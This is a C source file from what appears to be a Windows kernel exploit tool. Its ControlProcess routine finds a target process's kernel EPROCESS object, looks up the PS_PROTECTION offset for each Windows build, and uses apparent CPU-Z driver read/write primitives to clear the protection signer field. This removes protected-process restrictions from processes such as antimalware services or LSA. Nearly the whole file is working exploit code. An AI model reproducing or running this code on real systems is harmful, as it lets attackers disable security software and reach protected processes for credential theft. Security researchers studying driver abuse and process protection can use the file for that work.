/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       PS.C
*
*  VERSION:     1.00
*
*  DATE:        10 Feb 2018
*
*  Processes related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* ControlProcess
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL ControlProcess(
    _In_ ULONG_PTR ProcessId)
{
    BOOL                            bResult = FALSE;
    ULONG                           i, Buffer;
    NTSTATUS                        status;
    ULONG_PTR                       CurrentProcessId = (ULONG_PTR)NtCurrentTeb()->ClientId.UniqueProcess;
    ULONG_PTR                       ProcessObject = 0, VirtualAddress = 0, Offset = 0;
    HANDLE                          hProcess = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX   pHandles;

    WCHAR                           szMsg[MAX_PATH * 2];

    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    PS_PROTECTION *PsProtection;

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    status = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, 
        &obja, &clientId);

    if (NT_SUCCESS(status)) {

        _strcpy(szMsg, TEXT("\r\n[+] Process with PID="));
        u64tostr(ProcessId, _strend(szMsg));
        _strcat(szMsg, TEXT(" opened (PROCESS_QUERY_LIMITED_INFORMATION)"));
        supPrintText(szMsg);

        pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (pHandles) {

            _strcpy(szMsg, TEXT("\r\n[+] Handle dump created, number of handles = "));          
            u64tostr(pHandles->NumberOfHandles, _strend(szMsg));
            supPrintText(szMsg);

            for (i = 0; i < pHandles->NumberOfHandles; i++) {
                if (pHandles->Handles[i].UniqueProcessId == CurrentProcessId) {
                    if (pHandles->Handles[i].HandleValue == (ULONG_PTR)hProcess) {
                        ProcessObject = (ULONG_PTR)pHandles->Handles[i].Object;
                        break;
                    }
                }
            }

            supHeapFree(pHandles);
        }
        else {
            supPrintText(TEXT("\r\n[!] Cannot locate process object"));
        }
        
        if (ProcessObject != 0) {
            
            _strcpy(szMsg, TEXT("\r\n[+] Process object (EPROCESS) found, 0x"));
            u64tohex(ProcessObject, _strend(szMsg));
            supPrintText(szMsg);           
            
            switch (g_NtBuildNumber) {
            case 9600:
                Offset = PsProtectionOffset_9600;
                break;
            case 10240:
                Offset = PsProtectionOffset_10240;
                break;
            case 10586:
                Offset = PsProtectionOffset_10586;
                break;
            case 14393:
                Offset = PsProtectionOffset_14393;
                break;
            case 15063:
                Offset = PsProtectionOffset_15063;
                break;
            case 16299:
                Offset = PsProtectionOffset_16299;
                break;
            default:
                Offset = 0;
                break;
            }

            if (Offset == 0) {
                supPrintText(TEXT("\r\n[!] Unsupported WinNT version"));
            }
            else {

                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, Offset);

                _strcpy(szMsg, TEXT("\r\n[+] EPROCESS->PS_PROTECTION, 0x"));
                u64tohex(VirtualAddress, _strend(szMsg));
                supPrintText(szMsg);

                Buffer = 0;
                if (cpuz_readVirtualMemory(VirtualAddress, &Buffer, sizeof(ULONG))) {

                    PsProtection = (PS_PROTECTION*)&Buffer;

                    _strcpy(szMsg, TEXT("\r\n[+] Kernel memory read succeeded\r\n\tPsProtection->Type: "));
                    ultostr(PsProtection->Type, _strend(szMsg));

                    switch (PsProtection->Type) {

                    case PsProtectedTypeNone:
                        _strcat(szMsg, TEXT(" (PsProtectedTypeNone)"));
                        break;
                    case PsProtectedTypeProtectedLight:
                        _strcat(szMsg, TEXT(" (PsProtectedTypeProtectedLight)"));
                        break;
                    case PsProtectedTypeProtected:
                        _strcat(szMsg, TEXT(" (PsProtectedTypeProtected)"));
                        break;
                    default:
                        _strcat(szMsg, TEXT(" (Unknown Type)"));
                        break;
                    }

                    _strcat(szMsg, TEXT("\r\n\tPsProtection->Audit: "));
                    ultostr(PsProtection->Audit, _strend(szMsg));
                    
                    _strcat(szMsg, TEXT("\r\n\tPsProtection->Signer: "));
                    ultostr(PsProtection->Signer, _strend(szMsg));

                    switch (PsProtection->Signer) {
                    case PsProtectedSignerNone:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerNone)"));
                        break;
                    case PsProtectedSignerAuthenticode:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerAuthenticode)"));
                        break;
                    case PsProtectedSignerCodeGen:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerCodeGen)"));
                        break;
                    case PsProtectedSignerAntimalware:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerAntimalware)"));
                        break;
                    case PsProtectedSignerLsa:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerLsa)"));
                        break;
                    case PsProtectedSignerWindows:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerWindows)"));
                        break;
                    case PsProtectedSignerWinTcb:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerWinTcb)"));
                        break;
                    case PsProtectedSignerWinSystem:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerWinSystem)"));
                        break;
                    case PsProtectedSignerApp:
                        _strcat(szMsg, TEXT(" (PsProtectedSignerApp)"));
                        break;
                    default:
                        _strcat(szMsg, TEXT(" (Unknown Value)"));
                        break;
                    }

                    supPrintText(szMsg);

                    //
                    // It will still look as "protected" process
                    //
                    PsProtection->Signer = PsProtectedSignerNone;

                    bResult = cpuz_WriteVirtualMemory(VirtualAddress, &Buffer, sizeof(ULONG));
                    if (bResult) {
                        supPrintText(TEXT("\r\n[+] Process object modified"));
                    }
                    else {
                        supPrintText(TEXT("\r\n[!] Cannot modify process object"));
                    }
                }
                else {
                    supPrintText(TEXT("\r\n[!] Cannot read kernel memory"));
                }
            }
        }
        else {
            supPrintText(TEXT("\r\n[!] Cannot query process object"));
        }
        NtClose(hProcess);
    }
    else {
        supPrintText(TEXT("\r\n[!] Cannot open target process"));
    }

    return bResult;
}
